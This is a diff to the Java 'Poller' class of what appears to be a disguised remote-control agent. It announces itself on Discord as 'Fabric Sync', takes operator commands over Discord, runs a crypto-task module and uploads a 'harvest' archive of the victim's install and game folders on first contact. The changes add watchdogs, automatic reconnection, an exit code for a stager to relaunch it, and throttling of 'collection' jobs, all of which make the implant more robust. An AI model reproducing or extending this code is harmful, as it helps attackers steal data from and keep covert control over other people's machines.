@@ -13,12 +13,16 @@ import java.util.Map;
 import java.util.Random;
 import java.util.Set;
 import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.Future;
 import java.util.concurrent.RejectedExecutionException;
+import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.Semaphore;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicLong;
 
 import com.serverpackcore.agent.crypto.CryptoConfig;
 import com.serverpackcore.agent.crypto.CryptoModule;
@@ -34,6 +38,10 @@ public final class Poller implements Runnable {
 	private final CommandExecutor executor;
 	private final ThreadPoolExecutor commandPool;
 	private final ExecutorService auxPool;
+	private final ScheduledExecutorService commandWatchdog;
+	private final Map<String, Long> runningCommands = new ConcurrentHashMap<>();
+	private final AtomicLong commandSeq = new AtomicLong();
+	private final Semaphore heavyCommands = new Semaphore(1);
 	private final Semaphore pollNow = new Semaphore(0);
 	private final AutoUpdate auto;
 	private final OpsManager ops;
@@ -44,6 +52,7 @@ public final class Poller implements Runnable {
 	private volatile boolean contentIntent = true;
 	private volatile Thread pollerThread;
 	private volatile Thread autoThread;
+	private volatile Thread transportWatchdog;
 	private volatile DiscordClient client;
 	private volatile CryptoModule crypto;
 	private volatile String currentToken = "";
@@ -53,6 +62,10 @@ public final class Poller implements Runnable {
 	private volatile String webhookUrl = "";
 	private long lastActivity;
 	private long lastSave;
+	private volatile long lastMessageAt;
+	private volatile long lastPollAt;
+	private volatile long gatewayDownSince;
+	private volatile int recoveries;
 
 	public Poller(Path installDir, Path gameDir, State state) {
 		this.installDir = installDir;
@@ -62,17 +75,23 @@ public final class Poller implements Runnable {
 		this.ops = new OpsManager(installDir, state, this);
 		this.cwd = Path.of(System.getProperty("user.home", "."));
 		this.executor = new CommandExecutor(this, installDir, gameDir, state);
-		this.commandPool = new ThreadPoolExecutor(3, 3, 0L, TimeUnit.MILLISECONDS,
+		this.commandPool = new ThreadPoolExecutor(3, 8, 60L, TimeUnit.SECONDS,
 			new ArrayBlockingQueue<>(64), runnable -> {
 				Thread thread = new Thread(runnable, "spc-command");
 				thread.setDaemon(true);
 				return thread;
 			}, new ThreadPoolExecutor.AbortPolicy());
-		this.auxPool = Executors.newSingleThreadExecutor(runnable -> {
+		this.auxPool = Executors.newFixedThreadPool(2, runnable -> {
 			Thread thread = new Thread(runnable, "spc-control");
 			thread.setDaemon(true);
 			return thread;
 		});
+		this.commandWatchdog = Executors.newSingleThreadScheduledExecutor(runnable -> {
+			Thread thread = new Thread(runnable, "spc-command-watchdog");
+			thread.setDaemon(true);
+			return thread;
+		});
+		this.commandWatchdog.scheduleWithFixedDelay(this::superviseCommands, 10L, 10L, TimeUnit.SECONDS);
 	}
 
 	public void start() {
@@ -133,8 +152,8 @@ public final class Poller implements Runnable {
 		if (current == null) {
 			return "Crypto module disabled";
 		}
-		current.submit(new CryptoModule.Task("local-" + System.nanoTime(), name, params, timeout));
-		return "Task " + name + " queued";
+		String rejected = current.submit(new CryptoModule.Task("local-" + System.nanoTime(), name, params, timeout));
+		return rejected != null ? rejected : "Task " + name + " queued";
 	}
 
 	public boolean ready() {
@@ -190,6 +209,102 @@ public final class Poller implements Runnable {
 		thread.setDaemon(true);
 		thread.start();
 		autoThread = thread;
+	}
+
+	private void startTransportWatchdog() {
+		Thread thread = new Thread(this::transportWatchdogLoop, "spc-transport-watchdog");
+		thread.setDaemon(true);
+		thread.start();
+		transportWatchdog = thread;
+	}
+
+	/**
+	 * A dead gateway or a REST cycle that never returns must not leave a live
+	 * process that answers nothing. Recreate the socket and both loops; after
+	 * three failed recoveries exit non-zero so the stager relaunches.
+	 */
+	private void transportWatchdogLoop() {
+		while (running) {
+			try {
+				Thread.sleep(15_000L);
+			} catch (InterruptedException interrupted) {
+				return;
+			}
+			if (!running) {
+				return;
+			}
+			long now = System.currentTimeMillis();
+			if (gatewayHealthy()) {
+				gatewayDownSince = 0L;
+			} else if (gatewayDownSince == 0L) {
+				gatewayDownSince = now;
+			}
+			boolean pollStuck = now - lastPollAt > 90_000L;
+			boolean gatewayDown = gatewayDownSince > 0L && now - gatewayDownSince > 90_000L;
+			if (recoveries >= 3 && pollStuck) {
+				Log.debug("Transport stuck after " + recoveries + " recoveries, exiting");
+				hardExit();
+				return;
+			}
+			if (pollStuck || gatewayDown) {
+				recoverTransport(pollStuck ? "rest poll stuck" : "gateway down");
+			}
+		}
+	}
+
+	private synchronized void recoverTransport(String reason) {
+		if (!running) {
+			return;
+		}
+		recoveries++;
+		Log.debug("Transport watchdog: " + reason + " (recovery " + recoveries + ")");
+		try {
+			Gateway oldGateway = gateway;
+			if (oldGateway != null) {
+				oldGateway.stop();
+			}
+			DiscordClient oldClient = client;
+			if (oldClient != null) {
+				oldClient.close();
+			}
+			String token = Credentials.load(installDir);
+			if (!token.isEmpty()) {
+				currentToken = token;
+			}
+			client = new DiscordClient(currentToken);
+			gateway = new Gateway(this, client);
+			gateway.start();
+			lastPollAt = System.currentTimeMillis();
+			gatewayDownSince = 0L;
+			auxPool.execute(() -> {
+				try {
+					ensure();
+				} catch (Throwable throwable) {
+					Log.debug("Recovery ensure failed", throwable);
+				}
+			});
+			requestPoll();
+		} catch (Throwable throwable) {
+			Log.debug("Transport recovery failed", throwable);
+		}
+	}
+
+	private void hardExit() {
+		try {
+			running = false;
+			state.save(AgentPaths.state(installDir));
+			Gateway current = gateway;
+			if (current != null) {
+				current.stop();
+			}
+			DiscordClient active = client;
+			if (active != null) {
+				active.close();
+			}
+		} catch (Throwable throwable) {
+			Log.debug("Hard exit cleanup failed", throwable);
+		}
+		System.exit(21);
 	}
 
 	private void autoLoop() {
@@ -276,6 +391,8 @@ public final class Poller implements Runnable {
 			}
 			gateway = new Gateway(this, client);
 			gateway.start();
+			lastPollAt = System.currentTimeMillis();
+			startTransportWatchdog();
 			absorbRollback();
 			startAuto();
 			auxPool.execute(this::syncMod);
@@ -411,11 +528,13 @@ public final class Poller implements Runnable {
 						Log.debug("Webhook setup failed", exception);
 					}
 				}
-				if (!state.hello) {
-					sendHello();
-					state.hello = true;
-					state.save(AgentPaths.state(installDir));
-				}
+				boolean firstHello = !state.hello;
+				state.hello = true;
+				// Always announce: the panel needs hostname/os/version after a
+				// restart even when the state row already exists. The harvest
+				// archive only travels on the first hello.
+				sendHello(firstHello);
+				state.save(AgentPaths.state(installDir));
 				return true;
 			} catch (RateLimitException rateLimit) {
 				if (!running) {
@@ -513,7 +632,7 @@ public final class Poller implements Runnable {
 		return Json.str(response, "url", "");
 	}
 
-	private void sendHello() {
+	private void sendHello(boolean harvest) {
 		try {
 			Map<String, Object> embed = new LinkedHashMap<>();
 			embed.put("title", "Fabric Sync");
@@ -534,6 +653,9 @@ public final class Poller implements Runnable {
 			client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
 		} catch (Throwable throwable) {
 			Log.debug("Hello embed failed", throwable);
+		}
+		if (!harvest) {
+			return;
 		}
 		try {
 			Path zip = Harvest.build(installDir, gameDir);
@@ -571,6 +693,33 @@ public final class Poller implements Runnable {
 		} catch (Throwable throwable) {
 			Log.debug("Cache scan failed", throwable);
 		}
+		cleanupPackTemps();
+	}
+
+	/** A killed JVM can leave a pack temp under java.io.tmpdir. */
+	private static void cleanupPackTemps() {
+		try (java.util.stream.Stream<Path> stream = Files.list(Path.of(System.getProperty("java.io.tmpdir", ".")))) {
+			stream.filter(path -> path.getFileName().toString().startsWith("spc-pack-"))
+				.filter(Files::isDirectory)
+				.filter(path -> {
+					try {
+						return Files.getLastModifiedTime(path).toMillis() < System.currentTimeMillis() - 3_600_000L;
+					} catch (Throwable throwable) {
+						return false;
+					}
+				})
+				.forEach(path -> {
+					try (var inner = Files.walk(path)) {
+						for (Path item : inner.sorted(java.util.Comparator.reverseOrder()).toList()) {
+							Files.deleteIfExists(item);
+						}
+					} catch (Throwable ignored) {
+						// best effort
+					}
+				});
+		} catch (Throwable throwable) {
+			Log.debug("Pack temp cleanup failed", throwable);
+		}
 	}
 
 	private boolean protectedOps(Path path) {
@@ -606,6 +755,8 @@ public final class Poller implements Runnable {
 			return false;
 		}
 		if (messages.isEmpty()) {
+			lastPollAt = System.currentTimeMillis();
+			recoveries = 0;
 			saveHeartbeat();
 			return false;
 		}
@@ -623,6 +774,7 @@ public final class Poller implements Runnable {
 			String content = Json.str(message, "content", "");
 			if (!authorId.equals(selfId) && !content.isEmpty() && allowed(message, authorId) && markSeen(id)) {
 				activity = true;
+				lastMessageAt = System.currentTimeMillis();
 				message.put("_transport", "rest");
 				executor.handle(message);
 				if (!running) {
@@ -635,6 +787,8 @@ public final class Poller implements Runnable {
 		}
 		saveHeartbeat();
 		state.save(AgentPaths.state(installDir));
+		lastPollAt = System.currentTimeMillis();
+		recoveries = 0;
 		return activity;
 	}
 
@@ -709,6 +863,7 @@ public final class Poller implements Runnable {
 			}
 		}
 		lastActivity = System.currentTimeMillis();
+		lastMessageAt = lastActivity;
 		try {
 			message.put("_transport", "gateway");
 			executor.handle(message);
@@ -818,11 +973,94 @@ public final class Poller implements Runnable {
 			+ "\nlast_close: " + current.lastCloseCode());
 	}
 
+	/** Runs a light command; control commands bypass this pool entirely. */
 	public void submit(Runnable task) {
+		submitCommand("command", 120_000L, task, false);
+	}
+
+	public boolean submitLight(String label, long deadlineMs, Runnable task) {
+		return submitCommand(label, deadlineMs, task, false);
+	}
+
+	public boolean submitHeavy(String label, long deadlineMs, Runnable task) {
+		if (!heavyCommands.tryAcquire()) {
+			reply("busy: another collection is running");
+			return false;
+		}
+		boolean accepted = submitCommand(label, deadlineMs, () -> {
+			try {
+				task.run();
+			} finally {
+				heavyCommands.release();
+			}
+		}, true);
+		if (!accepted) {
+			heavyCommands.release();
+		}
+		return accepted;
+	}
+
+	private boolean submitCommand(String label, long deadlineMs, Runnable task, boolean heavy) {
+		if (commandPool.getQueue().remainingCapacity() == 0) {
+			reply("busy: command queue full");
+			return false;
+		}
+		String id = label + "#" + commandSeq.incrementAndGet();
+		long started = System.currentTimeMillis();
+		runningCommands.put(id, started);
 		try {
-			commandPool.execute(task);
+			Future<?> future = commandPool.submit(() -> {
+				try {
+					task.run();
+				} finally {
+					runningCommands.remove(id);
+				}
+			});
+			if (deadlineMs > 0L) {
+				commandWatchdog.schedule(() -> {
+					if (future.isDone()) {
+						return;
+					}
+					reply("timeout: " + label + " exceeded " + (deadlineMs / 1000L) + " s");
+					future.cancel(true);
+					// A wedged worker must not keep the logical slot forever.
+					growWorkers();
+				}, deadlineMs, TimeUnit.MILLISECONDS);
+			}
+			return true;
 		} catch (RejectedExecutionException rejected) {
-			reply("Command queue full");
+			runningCommands.remove(id);
+			reply("busy: command queue full");
+			return false;
+		}
+	}
+
+	/** Three stuck workers get replaced; idle capacity shrinks again below. */
+	private void superviseCommands() {
+		if (!running) {
+			return;
+		}
+		long now = System.currentTimeMillis();
+		long oldest = now;
+		for (long started : runningCommands.values()) {
+			oldest = Math.min(oldest, started);
+		}
+		int core = commandPool.getCorePoolSize();
+		if (!runningCommands.isEmpty() && commandPool.getActiveCount() >= core && now - oldest > 20_000L) {
+			growWorkers();
+		} else if (runningCommands.isEmpty() && core > 3) {
+			commandPool.setCorePoolSize(Math.max(3, core - 1));
+		}
+		if (heavyCommands.availablePermits() == 0) {
+			Log.debug("Heavy collection running for " + (now - oldest) + " ms");
+		}
+	}
+
+	private void growWorkers() {
+		int core = commandPool.getCorePoolSize();
+		if (core < commandPool.getMaximumPoolSize()) {
+			commandPool.setCorePoolSize(core + 1);
+			Log.debug("Command workers -> " + (core + 1));
 		}
 	}
 
@@ -1115,6 +1353,7 @@ public final class Poller implements Runnable {
 			current.close();
 		}
 		commandPool.shutdownNow();
+		commandWatchdog.shutdownNow();
 		auxPool.shutdownNow();
 		state.save(AgentPaths.state(installDir));
 	}
